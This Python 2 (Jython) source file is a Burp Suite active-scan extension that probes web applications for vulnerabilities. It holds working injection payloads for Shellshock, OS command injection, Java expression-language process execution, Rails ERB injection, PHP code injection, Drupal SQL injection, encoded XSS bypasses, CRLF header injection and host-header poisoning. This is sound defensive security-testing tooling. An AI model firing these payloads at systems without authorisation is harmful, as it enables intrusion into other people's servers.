# Author: James Kettle <albinowax+acz@gmail.com>
# Co-Developer: Zoltan Panczel <panczelz@gmail.com>
#
# Copyright 2014 Context Information Security up to 1.0.5
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
try:
    import pickle
    import random
    import re
    import string
    import time
    from string import Template
    from cgi import escape
    from java.net import URL

    from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, IScanIssue
    import jarray
except ImportError:
    print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."


version = "1.3.3"
callbacks = None
check = 1

class BurpExtender(IBurpExtender, IScannerInsertionPointProvider):
    def registerExtenderCallbacks(self, this_callbacks):
        global callbacks
        callbacks = this_callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.setExtensionName("ActiveScan3PLus")

        # Register host attack components
        host = HostAttack(callbacks)
        callbacks.registerScannerInsertionPointProvider(host)
	
        callbacks.registerScannerCheck(host)

        # Register code exec component
        callbacks.registerScannerCheck(CodeExec(callbacks))


        callbacks.registerScannerCheck(JetLeak(callbacks))

        callbacks.registerScannerCheck(PhpPregArray(callbacks))

	callbacks.registerScannerCheck(UTF8Xss(callbacks))
	
	callbacks.registerScannerCheck(PhpExtract(callbacks))
	
	callbacks.registerScannerCheck(CheckTempFiles(callbacks))

	callbacks.registerScannerCheck(UTF8Clrf(callbacks))

	callbacks.registerScannerCheck(ELInjection(callbacks))

	callbacks.registerScannerCheck(RoRCheck(callbacks))

	callbacks.registerScannerInsertionPointProvider(self)

        print "Successfully loaded ActiveScan3Plus v" + version

        return

    def getInsertionPoints(self, baseRequestResponse):

        # Handle only CGI and PL extensions
	global check 
	check = 1
        path = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath()
	parameters = self._helpers.analyzeRequest(baseRequestResponse.getRequest()).getParameters()
        if '.' in path:
            ext = path.split('.')[-1]
        else:
            ext = ''
        if (ext in ['cgi','pl']):
		# retrieve the data parameter
		return [ InsertionPoint_Perl(self._helpers, baseRequestResponse.getRequest(), parameter) for parameter in parameters ]
	else:
        	return [ InsertionPoint_Drupal(self._helpers, baseRequestResponse.getRequest(), parameter) for parameter in parameters ]

# Perl DBI->quote() bypass
# Technique based on Netanel Rubin: The Perl Jam: Exploiting a 20 Year-old Vulnerability
class InsertionPoint_Perl(IScannerInsertionPoint):

    def __init__(self, helpers, baseRequest, dataParameter):
        self._helpers = helpers
        self._baseRequest = baseRequest
        self._dataParameter = dataParameter

        dataValue = dataParameter.getValue()
        # parse the location of the input string
        self._insertionPointPrefix = "'" + dataValue
        self._baseValue = dataValue
        self._insertionPointSuffix = "&" + dataParameter.getName() + "=2"
        return
            
    def getInsertionPointName(self):
        return self._dataParameter.getName()

    def getBaseValue(self):
        return self._baseValue

    def buildRequest(self, payload):
        # build the raw data using the specified payload
        input = self._insertionPointPrefix + self._helpers.urlEncode(self._helpers.bytesToString(payload)) + self._insertionPointSuffix
                
        # update the request with the new parameter value
        return self._helpers.updateParameter(self._baseRequest, self._helpers.buildParameter(self._dataParameter.getName(), input, IParameter.PARAM_URL if self._helpers.analyzeRequest(self._baseRequest).getMethod() == 'GET' else  IParameter.PARAM_BODY))

    def getPayloadOffsets(self, payload):
        # since the payload is being inserted into a serialized data structure, there aren't any offsets 
        # into the request where the payload literally appears
        return None

    def getInsertionPointType(self):
        return INS_EXTENSION_PROVIDED

# Detect Drupal SQL injection
# Technique based on http://www.securitysift.com/drupal-7-sqli/
class InsertionPoint_Drupal(IScannerInsertionPoint):

    def __init__(self, helpers, baseRequest, dataParameter):
        self._helpers = helpers
        self._baseRequest = baseRequest
	self._dataParameter = dataParameter

        # define the location of the input string
        self._insertionPointPrefix = "x&"+dataParameter.getName() + self._helpers.urlEncode("[0;select 1 from dual where '1'='1")
        self._baseValue = "x"
        self._insertionPointSuffix = ";#]=first&" + dataParameter.getName() + "[0]=second"
        return
    
    def getInsertionPointName(self):
        return self._dataParameter.getName()

    def getBaseValue(self):
        return self._baseValue

    def buildRequest(self, payload):
        # build the raw data using the specified payload
        input = self._insertionPointPrefix + self._helpers.urlEncode(self._helpers.bytesToString(payload)) + self._insertionPointSuffix;
        
        # update the request with the new parameter value
	newRequest = self._helpers.removeParameter(self._baseRequest, self._dataParameter)
	if(self._helpers.analyzeRequest(newRequest).getMethod() == 'GET' and self._dataParameter.getType() == 0):
		method = IParameter.PARAM_URL
	elif(self._helpers.analyzeRequest(newRequest).getMethod() == 'POST' and self._dataParameter.getType() == 1):
		method = IParameter.PARAM_BODY
	else:
		return None
        return self._helpers.updateParameter(newRequest, self._helpers.buildParameter(self._baseValue, input, method))

    def getPayloadOffsets(self, payload):
        # since the payload is being inserted into a serialized data structure, there aren't any offsets 
        # into the request where the payload literally appears
        return None

    def getInsertionPointType(self):
        return INS_EXTENSION_PROVIDED

# Check the temporary files/source code disclosure

class CheckTempFiles(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()
        self._done = getIssues('Source code disclosure')
	self._payloads = ["~","_ORIG","_orig","_old",".tar",".rar",".zip",".txt",".old",".bak",".tar.gz",".bck"]

    def doActiveScan(self, basePair, insertionPoint):
	global check
	if check == 0:
		return None

        if self._helpers.analyzeRequest(basePair.getRequest()).getMethod() == "GET":
                method = IParameter.PARAM_URL
        else:
                method = IParameter.PARAM_BODY

	path = self._helpers.analyzeRequest(basePair).getUrl().getPath()
        port = self._helpers.analyzeRequest(basePair).getUrl().getPort()
        proto = self._helpers.analyzeRequest(basePair).getUrl().getProtocol()
        hostname = self._helpers.analyzeRequest(basePair).getUrl().getHost()
	if not '.' in path:
		return None

	for temps in self._payloads:
		url = URL(proto,hostname,port,path+temps)
		newRequest = self._helpers.buildHttpRequest(url)
                attack = callbacks.makeHttpRequest(basePair.getHttpService(), newRequest)
		resp_code = self._helpers.analyzeResponse(attack.getResponse()).getStatusCode()

                if resp_code == 200:
	                url = self._helpers.analyzeRequest(attack).getUrl()
        	        print "Possible Source code disclosure!"
                        if (url not in self._done):
                            self._done.append(url)
                            return [CustomScanIssue(attack.getHttpService(), url, [attack], 'Source code disclosure', "The server contains temporary files.<p>", 'Tentative', 'Low')]
	
# Ruby on rails attacks
# Starting point: http://www.phrack.org/papers/attacking_ruby_on_rails.html
class RoRCheck(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()
        self._done = getIssues('Code injection')

    def doActiveScan(self, basePair, insertionPoint):
	global check
	if check == 0:
		return None
	check = 0
        if self._helpers.analyzeRequest(basePair.getRequest()).getMethod() == "GET":
                method = IParameter.PARAM_URL
        else:
                method = IParameter.PARAM_BODY

        parameters = self._helpers.analyzeRequest(basePair.getRequest()).getParameters()
	responseLength = len(basePair.getResponse()) # original response length

        for parameter in parameters:
            if parameter.getType() in [0,1]:
		    p0 = parameter.getName() + "[inline]" # testing phase!
		    
		    newRequest0 = self._helpers.removeParameter(basePair.getRequest(), parameter)
                    newParam0 = self._helpers.buildParameter(p0,"<%=`id`%>",method)
		    newRequest0 = self._helpers.addParameter(newRequest0, newParam0)

                    attack = callbacks.makeHttpRequest(basePair.getHttpService(), newRequest0)
                    resp = self._helpers.bytesToString(attack.getResponse())

                    if ("uid=" in resp) and ("gid=" in resp):
                        url = self._helpers.analyzeRequest(attack).getUrl()
                        print "Possible Ruby on Rails vulnerability!"
                        if (url not in self._done):
                            self._done.append(url)
                            return [CustomScanIssue(attack.getHttpService(), url, [attack], 'Code injection', "The application appears to evaluate user input. Ruby on Rails command injection.<p>", 'Tentative', 'High')]

# Detect php extract vulnerabilities
# Technique based on https://davidnoren.com/2013/07/03/php-extract-vulnerability/
class PhpExtract(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()
        self._done = getIssues('Code injection')

    def doActiveScan(self, basePair, insertionPoint):
	global check
	if check == 0:
		return None

        if self._helpers.analyzeRequest(basePair.getRequest()).getMethod() == "GET":
                method = IParameter.PARAM_URL
        else:
                method = IParameter.PARAM_BODY

        parameters = self._helpers.analyzeRequest(basePair.getRequest()).getParameters()
	responseLength = len(basePair.getResponse()) # original response length

        for parameter in parameters:
            if parameter.getType() in [0,1]:
		    p0 = "_SESSION[admin]=true&_SESSION[" + parameter.getName() + "]" # testing phase!

                    newParam0 = self._helpers.buildParameter(p0,"true",method)
                    newRequest0 = self._helpers.addParameter(basePair.getRequest(), newParam0)

                    attack = callbacks.makeHttpRequest(basePair.getHttpService(), newRequest0)
                    resp = self._helpers.bytesToString(attack.getResponse())

                    if len(resp)  > (responseLength * 1.5): # trying to minimize false positives!
                        url = self._helpers.analyzeRequest(attack).getUrl()
                        print "Possible PHP _SESSION Vulnerability!"
                        if (url not in self._done):
                            self._done.append(url)
                            return [CustomScanIssue(attack.getHttpService(), url, [attack], 'Code injection', "The application appears to evaluate user input. PHP SESSION[] manipulation<p>", 'Tentative', 'High')]

# Detect php pcre code injection
# Technique based on http://www.secalert.net/2013/12/13/ebay-remote-code-execution/
class PhpPregArray(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()
        self._done = getIssues('Code injection')
        self._payloads = "{${phpcredits()}}" # TODO: blind injection!

    def doActiveScan(self, basePair, insertionPoint):
	global check
	if check == 0:
		return None

	if self._helpers.analyzeRequest(basePair.getRequest()).getMethod() == "GET":
		method = IParameter.PARAM_URL
	else:
		method = IParameter.PARAM_BODY
	
        parameters = self._helpers.analyzeRequest(basePair.getRequest()).getParameters()
	
	for parameter in parameters:
            if parameter.getType() in [0,1]:
		    p0 = parameter.getName() + "[0]"
		    p1 = parameter.getName() + "[1]"

		    newRequest0 = self._helpers.removeParameter(basePair.getRequest(), parameter)

		    newParam0 = self._helpers.buildParameter(p0,"search",method)
		    newParam1 = self._helpers.buildParameter(p1,self._payloads,method)

		    newRequest0 = self._helpers.addParameter(newRequest0, newParam0)
		    newRequest0 = self._helpers.addParameter(newRequest0, newParam1)
		    
		    attack = callbacks.makeHttpRequest(basePair.getHttpService(), newRequest0)
		    resp = self._helpers.bytesToString(attack.getResponse())
		    if "Zend Scripting Language Engine" in resp:
			url = self._helpers.analyzeRequest(attack).getUrl()
			print "Possible PHP code injection vulnerability!"
			if (url not in self._done):
			    self._done.append(url)
			    return [CustomScanIssue(attack.getHttpService(), url, [attack], 'Code injection', "The application appears to evaluate user input as code.<p>", 'Certain', 'High')]

# Detect UTF8 encoded XSS (ValidateReqest bypass) and other validation bypass mechanisms
# Technique based on http://www.jardinesoftware.net/2011/07/17/bypassing-validaterequest/ and some additional checks
class UTF8Xss(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()
        self._done = getIssues('Cross-site scripting')
        self._payloads = ['%uff1cscript%uff1ealert(1)%uff1c/script%uff1e','<%00script>alert(1)<%00/script>','%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE','%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E','\\u003cscript\\u003ealert(1)\\u003c\\u002fscript\\u003e','%uff1ch1%uff1eabrakadabra(1)%uff1c/h1%uff1e','<%00h1>abrakadabra(1)<%00/h1>','%C0%BCh1%C0%BEabrakadabra(1)%C0%BC/h1%C0%BE','%EF%BC%9Ch1%EF%BC%9Eabrakadabra(1)%EF%BC%9C/h1%EF%BC%9E','\\u003ch1\\u003eabrakadabra(1)\\u003c\\u002fh1\\u003e','javascript%3A%2F%2F"><script>alert(1)</script>','javascript%3A%2F%2F"><script>abrakadabra(1)</script>','javascript:alert(1)/*\\nhttp://abrakadabra.com/','javascript:%0Aalert(1)/*\\nhttp://abrakadabra.com/','javascript:%3A%2F%2Falert(1)/*\\nhttp://abrakadabra.com/']

    def doActiveScan(self, basePair, insertionPoint):
	global check
	if check == 0:
		return None

	if self._helpers.analyzeRequest(basePair.getRequest()).getMethod() == 'GET':
		method = IParameter.PARAM_URL
	else:
		method = IParameter.PARAM_BODY
	
        parameters = self._helpers.analyzeRequest(basePair.getRequest()).getParameters()
	
	for parameter in parameters:
            if parameter.getType() in [0,1]:
		    for xss in self._payloads:
			    newRequest = self._helpers.removeParameter(basePair.getRequest(), parameter)
		    	    newParam = self._helpers.buildParameter(parameter.getName(),xss,method)
		    	    newRequest = self._helpers.addParameter(newRequest, newParam)

			    attack = callbacks.makeHttpRequest(basePair.getHttpService(), newRequest)
			    resp = self._helpers.bytesToString(attack.getResponse())
			    
			    if (">alert(1)<" in resp) or (">abrakadabra" in resp):
				url = self._helpers.analyzeRequest(attack).getUrl()
				if (url not in self._done):
				    self._done.append(url)
				    return [CustomScanIssue(attack.getHttpService(), url, [attack], 'Cross-site scripting', "The application appears to evaluate user input.<p>", 'Tentative', 'High')]
# Detect unicode CRLF attacks
class UTF8Clrf(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()
        self._done = getIssues('HTTP response header injection')
        self._payloads = ['%E5%98%8A%E5%98%8DSet-Cookie:%20abrakadabra']

    def doActiveScan(self, basePair, insertionPoint):
	global check
	if check == 0:
		return None

	if self._helpers.analyzeRequest(basePair.getRequest()).getMethod() == 'GET':
		method = IParameter.PARAM_URL
	else:
		method = IParameter.PARAM_BODY
	
        parameters = self._helpers.analyzeRequest(basePair.getRequest()).getParameters()
	
	for parameter in parameters:
            if parameter.getType() in [0,1]:
		    for clrf in self._payloads:
			    newRequest = self._helpers.removeParameter(basePair.getRequest(), parameter)
		    	    newParam = self._helpers.buildParameter(parameter.getName(),clrf,method)
		    	    newRequest = self._helpers.addParameter(newRequest, newParam)

			    attack = callbacks.makeHttpRequest(basePair.getHttpService(), newRequest)
			    resp = self._helpers.analyzeResponse(attack.getResponse()).getHeaders()
			    for injection in resp:
			    	if 'Set-Cookie: abrakadabra' in injection:
					url = self._helpers.analyzeRequest(attack).getUrl()
					if (url not in self._done):
					    self._done.append(url)
					    return [CustomScanIssue(attack.getHttpService(), url, [attack], 'HTTP response header injection', "The application appears to evaluate user input.<p>", 'Firm', 'High')]

# Detect ELInjection
# https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf
class ELInjection(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()
        self._done = getIssues('Code injection')
        self._payloads = ['${1234*4321}','{{1234*4321}}']

    def doActiveScan(self, basePair, insertionPoint):
	global check
	if check == 0:
		return None

	if self._helpers.analyzeRequest(basePair.getRequest()).getMethod() == 'GET':
		method = IParameter.PARAM_URL
	else:
		method = IParameter.PARAM_BODY
	
        parameters = self._helpers.analyzeRequest(basePair.getRequest()).getParameters()
	
	for parameter in parameters:
	    print "Param: " + str(parameter.getType())
#            if parameter.getType() in [0,1,6]:
	    for eli in self._payloads:
		    newRequest = self._helpers.removeParameter(basePair.getRequest(), parameter)
	    	    newParam = self._helpers.buildParameter(parameter.getName(),eli,method)
	    	    newRequest = self._helpers.addParameter(newRequest, newParam)

		    attack = callbacks.makeHttpRequest(basePair.getHttpService(), newRequest)
		    resp = self._helpers.analyzeResponse(attack.getResponse()).getHeaders()
		    for injection in resp:
		    	if '5332114' in injection:
				url = self._helpers.analyzeRequest(attack).getUrl()
				if (url not in self._done):
				    self._done.append(url)
				    return [CustomScanIssue(attack.getHttpService(), url, [attack], 'Code injection', "The application appears to evaluate user input as code.<p>", 'Certain', 'High')]

# Detect CVE-2015-2080
# Technique based on https://github.com/GDSSecurity/Jetleak-Testing-Script/blob/master/jetleak_tester.py
class JetLeak(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()

    def doActiveScan(self, basePair, insertionPoint):

        if 'Referer' != insertionPoint.getInsertionPointName():
            return None
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest("\x00"))
        resp_start = self._helpers.bytesToString(attack.getResponse())[:90]
        if '400 Illegal character 0x0 in state' in resp_start and '<<<' in resp_start:
            return [CustomScanIssue(attack.getHttpService(), self._helpers.analyzeRequest(attack).getUrl(), [attack], 'CVE-2015-2080 (JetLeak)',
                                                "The application appears to be running a version of Jetty vulnerable to CVE-2015-2080, which allows attackers to read out private server memory<br/>"
                                                "Please refer to http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html for further information", 'Firm', 'High')]
        return None

# This extends the active scanner with a number of timing-based code execution checks
# _payloads contains the payloads, designed to delay the response by $time seconds
# _extensionMappings defines which payloads get called on which file extensions
class CodeExec(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()

        self._done = getIssues('Code injection')

        self._payloads = {
            # Exploits shell command injection into '$input' on linux and "$input" on windows:
            # and CVE-2014-6271, CVE-2014-6278
            'any': ['"&ping -n $time localhost&\'`sleep $time`\'', '() { :;}; /bin/sleep $time', '() { _; } >_[$$($$())] { /bin/sleep $time; }'],
            'php': [],
            'perl': [],
            'ruby': ['|sleep $time & ping -n $time localhost'],
            # Expression language injection
            'java': [
                '$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
        }

        # Used to ensure only appropriate payloads are attempted
        self._extensionMappings = {
            'php5': 'php',
            'php4': 'php',
            'php3': 'php',
            'php': 'php',
            'pl': 'perl',
            'cgi': 'perl',
            'jsp': 'java',
            'do': 'java',
            'action': 'java',
            'rb': 'ruby',
            '': ['php', 'ruby', 'java'],
            'unrecognised': 'java',

            # Code we don't have exploits for
            'asp': 'any',
            'aspx': 'any',
        }

    def doActiveScan(self, basePair, insertionPoint):

        if (insertionPoint.getInsertionPointName() == "hosthacker"):
            return None

        # Decide which payloads to use based on the file extension, using a set to prevent duplicate payloads          
        payloads = set()
        languages = self._getLangs(basePair)
        for lang in languages:
            new_payloads = self._payloads[lang]
            payloads |= set(new_payloads)
        payloads.update(self._payloads['any'])

        # Time how long each response takes compared to the baseline
        # Assumes <4 seconds jitter
        baseTime = 0
        for payload in payloads:
            if (baseTime == 0):
                baseTime = self._attack(basePair, insertionPoint, payload, 0)[0]
            if (self._attack(basePair, insertionPoint, payload, 11)[0] > baseTime + 6):
                print "Suspicious delay detected. Confirming it's consistent..."
                (dummyTime, dummyAttack) = self._attack(basePair, insertionPoint, payload, 0)
                if (dummyTime < baseTime + 4):
                    (timer, attack) = self._attack(basePair, insertionPoint, payload, 11)
                    if (timer > dummyTime + 6):
                        print "Code execution confirmed"
                        url = self._helpers.analyzeRequest(attack).getUrl()
                        if (url in self._done):
                            print "Skipping report - vulnerability already reported"
                            break
                        self._done.append(url)
                        return [CustomScanIssue(attack.getHttpService(), url, [dummyAttack, attack], 'Code injection',
                                                "The application appears to evaluate user input as code.<p> It was instructed to sleep for 0 seconds, and a response time of <b>" + str(
                                                    dummyTime) + "</b> seconds was observed. <br/>It was then instructed to sleep for 10 seconds, which resulted in a response time of <b>" + str(
                                                    timer) + "</b> seconds", 'Firm', 'High')]

        return None

    def _getLangs(self, basePair):
        path = self._helpers.analyzeRequest(basePair).getUrl().getPath()
        if '.' in path:
            ext = path.split('.')[-1]
        else:
            ext = ''

        if (ext in self._extensionMappings):
            code = self._extensionMappings[ext]
        else:
            code = self._extensionMappings['unrecognised']
        if (isinstance(code, basestring)):
            code = [code]
        return code


    def _attack(self, basePair, insertionPoint, payload, sleeptime):
        payload = Template(payload).substitute(time=sleeptime)

        # Use a hack to time the request. This information should be accessible via the API eventually.
        timer = time.time()
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest(payload))
        timer = time.time() - timer
        print "Response time: " + str(round(timer, 2)) + "| Payload: " + payload

        requestHighlights = insertionPoint.getPayloadOffsets(payload)
        if (not isinstance(requestHighlights, list)):
            requestHighlights = [requestHighlights]
        attack = callbacks.applyMarkers(attack, requestHighlights, None)

        return (timer, attack)


class HostAttack(IScannerInsertionPointProvider, IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()

        self._referer = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(6))

        # Load previously identified scanner issues to prevent duplicates
        try:
            self._rebind = map(lambda i: i.getAuthority(), getIssues('Arbitrary host header accepted'))
        except Exception:
            print "Initialisation callback failed. This extension requires burp suite professional and Jython 2.5."

        self._poison = getIssues('Host header poisoning')

    def getInsertionPoints(self, basePair):
        rawHeaders = self._helpers.analyzeRequest(basePair.getRequest()).getHeaders()

        # Parse the headers into a dictionary
        headers = dict((header.split(': ')[0].upper(), header.split(': ', 1)[1]) for header in rawHeaders[1:])

        # If the request doesn't use the host header, bail
        if ('HOST' not in headers.keys()):
            return None

        response = self._helpers.bytesToString(basePair.getResponse())

        # If the response doesn't reflect the host header we can't identify successful attacks
        if (headers['HOST'] not in response):
            print "Skipping host header attacks on this request as the host isn't reflected"
            return None

        return [HostInsertionPoint(self._helpers, basePair, headers)]


    def doActiveScan(self, basePair, insertionPoint):

        # Return if the insertion point isn't the right one
        if (insertionPoint.getInsertionPointName() != "hosthacker"):
            return None

        # Return if we've already flagged both issues on this URL
        url = self._helpers.analyzeRequest(basePair).getUrl()
        host = url.getAuthority()
        if (host in self._rebind and url in self._poison):
            return None

        # Send a baseline request to learn what the response should look like    
        legit = insertionPoint.getBaseValue()
        (attack, resp) = self._attack(basePair, insertionPoint, {'host': legit}, legit)
        baseprint = tagmap(resp)

        # Send several requests with invalid host headers and observe whether they reach the target application, and whether the host header is reflected
        taint = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(6))
        taint += '.' + legit
        issues = []

        # Host: evil.legit.com
        (attack, resp) = self._attack(basePair, insertionPoint, {'host': taint}, taint)
        if (hit(resp, baseprint)):

            # flag DNS-rebinding if we haven't already, and the page actually has content
            if (baseprint != '' and host not in self._rebind):
                issues.append(self._raise(basePair, attack, host, 'dns'))

            if (taint in resp and url not in self._poison and self._referer not in resp):
                issues.append(self._raise(basePair, attack, host, 'host'))
                return issues
        else:
            # The application might not be the default VHost, so try an absolute URL:
            #	GET http://legit.com/foo
            #	Host: evil.com
            (attack, resp) = self._attack(basePair, insertionPoint, {'abshost': legit, 'host': taint}, taint)
            if (hit(resp, baseprint) and taint in resp and url not in self._poison and self._referer not in resp):
                issues.append(self._raise(basePair, attack, host, 'abs'))

        #	Host: legit.com
        #	X-Forwarded-Host: evil.com
        (attack, resp) = self._attack(basePair, insertionPoint, {'host': legit, 'xfh': taint}, taint)
        if (hit(resp, baseprint) and taint in resp and url not in self._poison and self._referer not in resp):
            issues.append(self._raise(basePair, attack, host, 'xfh'))

        return issues

    def _raise(self, basePair, attack, host, type):
        service = attack.getHttpService()
        url = self._helpers.analyzeRequest(attack).getUrl()

        if (type == 'dns'):
            title = 'Arbitrary host header accepted'
            sev = 'Low'
            conf = 'Certain'
            desc = """The application appears to be accessible using arbitrary HTTP Host headers. <br/><br/>
            
                    This is a serious issue if the application is not externally accessible or uses IP-based access restrictions. Attackers can use DNS Rebinding to bypass any IP or firewall based access restrictions that may be in place, by proxying through their target's browser.<br/>
                    Note that modern web browsers' use of DNS pinning does not effectively prevent this attack. The only effective mitigation is server-side: https://bugzilla.mozilla.org/show_bug.cgi?id=689835#c13<br/><br/>
                    
                    Additionally, it may be possible to directly bypass poorly implemented access restrictions by sending a Host header of 'localhost'"""
            self._rebind.append(host)
        else:
            title = 'Host header poisoning'
            sev = 'Medium'
            conf = 'Tentative'
            desc = """The application appears to trust the user-supplied host header. By supplying a malicious host header with a password reset request, it may be possible to generate a poisoned password reset link. Consider testing the host header for classic server-side injection vulnerabilities.<br/>
                    <br/>
                    Depending on the configuration of the server and any intervening caching devices, it may also be possible to use this for cache poisoning attacks.<br/>
                    <br/>
                    Resources: <br/><ul>
                        <li>http://carlos.bueno.org/2008/06/host-header-injection.html<br/></li>
                        <li>http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</li>
                        </ul>
            """
            self._poison.append(url)
        issue = CustomScanIssue(service, url, [basePair, attack], title, desc, conf, sev)
        return issue

    def _attack(self, basePair, insertionPoint, payloads, taint):
        proto = self._helpers.analyzeRequest(basePair).getUrl().getProtocol() + '://'
        if ('abshost' in payloads):
            payloads['abshost'] = proto + payloads['abshost']
        payloads['referer'] = proto + taint + '/' + self._referer
        print "Host attack: " + str(payloads)
        attack = callbacks.makeHttpRequest(basePair.getHttpService(),
                                           insertionPoint.buildRequest('hosthacker' + pickle.dumps(payloads)))
        response = self._helpers.bytesToString(attack.getResponse())
        requestHighlights = [jarray.array([m.start(), m.end()], 'i') for m in
                             re.finditer('(' + '|'.join(payloads.values()) + ')',
                                         self._helpers.bytesToString(attack.getRequest()))]
        responseHighlights = [jarray.array([m.start(), m.end()], 'i') for m in re.finditer(taint, response)]
        attack = callbacks.applyMarkers(attack, requestHighlights, responseHighlights)
        return (attack, response)


# Take input from HostAttack.doActiveScan() and use it to construct a HTTP request
class HostInsertionPoint(IScannerInsertionPoint):
    def __init__(self, helpers, basePair, rawHeaders):
        self._helpers = helpers
        self._baseHost = rawHeaders['HOST']
        request = self._helpers.bytesToString(basePair.getRequest())
        request = request.replace('$', '\$')
        request = request.replace('/', '$abshost/', 1)

        # add a cachebust parameter
        if ('?' in request[0:request.index('\n')]):
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1&cachebust=${cachebust}', request, 1)
        else:
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1?cachebust=${cachebust}', request, 1)

        request = re.sub('(?im)^Host: [a-zA-Z0-9-_.:]*', 'Host: ${host}${xfh}', request, 1)
        if ('REFERER' in rawHeaders):
            request = re.sub('(?im)^Referer: http[s]?://[a-zA-Z0-9-_.:]*', 'Referer: ${referer}', request, 1)

        if ('CACHE-CONTROL' in rawHeaders):
            request = re.sub('(?im)^Cache-Control: [^\r\n]+', 'Cache-Control: no-cache', request, 1)
        else:
            request = request.replace('Host: ${host}${xfh}', 'Host: ${host}${xfh}\r\nCache-Control: no-cache', 1)

        self._requestTemplate = Template(request)
        return None

    def getInsertionPointName(self):
        return "hosthacker"

    def getBaseValue(self):
        return self._baseHost

    def buildRequest(self, payload):

        # Drop the attack if it didn't originate from my scanner
        # This will cause an exception, no available workarounds at this time
        payload = self._helpers.bytesToString(payload)
        if (payload[:10] != 'hosthacker'):
            return None

        # Load the supplied payloads into the request
        payloads = pickle.loads(payload[10:])
        if 'xfh' in payloads:
            payloads['xfh'] = "\r\nX-Forwarded-Host: " + payloads['xfh']

        for key in ('xfh', 'abshost', 'host', 'referer'):
            if key not in payloads:
                payloads[key] = ''

        # Ensure that the response to our request isn't cached - that could be harmful
        payloads['cachebust'] = time.time()

        request = self._requestTemplate.substitute(payloads)
        return self._helpers.stringToBytes(request)


    def getPayloadOffsets(self, payload):
        return None

    def getInsertionPointType(self):
        return INS_EXTENSION_PROVIDED


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail + '<br/><br/><div style="font-size:8px">This issue was reported by ActiveScan++</div>'
        self.Severity = severity
        self.Confidence = confidence
        print "Reported: " + name + " on " + str(url)
        return

    def getUrl(self):
        return self.Url

    def getIssueName(self):
        return self.Name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self.Severity

    def getConfidence(self):
        return self.Confidence

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self.Detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages

    def getHttpService(self):
        return self.HttpService


# misc utility methods
def location(url):
    return url.getProtocol() + "://" + url.getAuthority() + url.getPath()


def htmllist(list):
    list = ["<li>" + item + "</li>" for item in list]
    return "<ul>" + "\n".join(list) + "</ul>"


def tagmap(resp):
    tags = ''.join(re.findall("(?im)(<[a-z]+)", resp))
    return tags


def hit(resp, baseprint):
    return (baseprint == tagmap(resp))


# currently unused as .getUrl() ignores the query string
def issuesMatch(existingIssue, newIssue):
    if (existingIssue.getUrl() == newIssue.getUrl() and existingIssue.getIssueName() == newIssue.getIssueName()):
        return -1
    else:
        return 0


def getIssues(name):
    prev_reported = filter(lambda i: i.getIssueName() == name, callbacks.getScanIssues(''))
    return (map(lambda i: i.getUrl(), prev_reported))
